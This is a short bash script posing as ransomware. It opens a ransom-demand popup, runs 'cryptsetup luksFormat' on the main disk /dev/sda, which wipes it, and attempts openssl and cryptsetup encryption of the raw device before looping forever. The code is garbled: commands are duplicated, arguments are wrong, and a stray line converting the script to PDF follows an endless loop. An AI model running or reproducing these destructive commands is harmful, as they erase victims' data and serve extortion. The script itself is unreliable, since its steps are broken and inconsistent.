#!/bin/bash

zenity --info --title="Your computer has been locked" --text="This computer has been locked due to non-payment of ransom. To unlock your computer, please contact us at [email protected] and provide the following code: [code]" --modal --on-close="exit" &

cryptsetup luksFormat /dev/sda
cryptsetup open /dev/sda crypt_luks
openssl enc -aes-256-cbc -pbkdf2 -in /dev/sda -out encrypted_luks_header.bin
cryptsetup encrypt /dev/sda encrypted_luks_header.bin
cryptsetup encrypt /dev/sda encrypted_luks_header.bin

while true; do
sleep 1
done
convert --density 300 script.sh script.pdf
